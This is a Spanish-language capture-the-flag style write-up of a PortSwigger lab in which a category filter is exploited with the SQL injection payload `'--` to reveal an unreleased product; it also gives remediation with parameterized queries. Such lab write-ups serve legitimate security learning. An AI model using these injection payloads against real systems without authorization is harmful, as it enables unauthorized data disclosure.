# SQL injection in WHERE clause — Retrieval of Hidden Data

## Info
- **Dificultad**: Apprentice
- **URL**: https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data
- **Fecha**: 2026-08-05
- **Estado**: SOLVED (verificado, banner "solved")

## Objetivo
Realizar un ataque de SQL injection que haga que la aplicación muestre uno o más productos no publicados (`released = 0`).

## Reconocimiento
- La app es una tienda con filtro por categoría: `/filter?category=<valor>`.
- Categorías reales (verificadas): `Accessories`, `Clothing, shoes and accessories`, `Food & Drink`, `Lifestyle`. (Nota: "Gifts" del tutorial no existe en este lab.)
- La query subyacente es: `SELECT * FROM products WHERE category = '<input>' AND released = 1`.
- Baseline `Accessories` → **3 productos** (Cheshire Cat Grin, Six Pack Beer Belt, ZZZZZZ Bed).

## Vulnerabilidad
El parámetro `category` se concatena directamente en la query SQL sin parametrizar. Inyectar `'--` cierra la cadena y comenta el resto de la query, eliminando el filtro `AND released = 1`.

## Explotación
Request:
```
GET /filter?category=Accessories'--
```
Query resultante:
```sql
SELECT * FROM products WHERE category = 'Accessories'--' AND released = 1
```
El `--` comenta `' AND released = 1`, revelando productos no publicados.

**Evidencia real (curl):**
- Baseline `Accessories` → 3 productos.
- Exploit `Accessories'--` → **4 productos**, revelando **"Giant Pillow Thing"** (el no publicado).

## Impacto
- **Data disclosure**: acceso a productos no publicados (información que el negocio quería ocultar).
- En un caso real, esto escala a leer datos de otras tablas (UNION), modificar datos, o RCE según el DBMS.

## Remediation
- **Prepared statements / parameterized queries** (nunca concatenar input en SQL).
- La query debe ser: `SELECT * FROM products WHERE category = ? AND released = 1` con `setString(1, input)`.
- Validación de entrada como defensa en profundidad (whitelist de categorías).

## Lección aprendida
- El filtro de categoría es el punto de entrada clásico de SQLi en WHERE clause.
- Verificar las categorías reales del lab antes de explotar (no asumir las del tutorial).
- `'--` es el payload más simple para comentar el resto de la query y revelar datos ocultos.
- Para bug bounty real: este patrón (parámetro de filtro no parametrizado) es extremadamente común y de alto impacto.
